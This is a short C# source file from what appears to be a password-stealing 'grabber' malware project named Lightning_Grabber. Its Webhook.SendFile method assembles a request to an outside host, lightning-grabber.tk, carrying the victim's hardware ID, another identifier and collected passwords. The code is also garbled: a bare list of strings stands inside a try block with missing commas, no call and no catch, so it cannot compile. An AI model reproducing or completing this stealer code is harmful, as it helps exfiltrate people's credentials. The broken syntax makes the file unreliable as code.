using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Lightning_Grabber.Resources
{
    internal class Webhook
    {
        public static void SendFile(string filepath, string ci, string name)
        {
            try
            {
                "https://lightning-grabber.tk/send.js",
                    name
                    "&hwid=",
                    Helper.Hwid(),
                    "&ci=",
                    ci
                    "&p=",
                    Counter.passwords,

            }
        }
    }
}
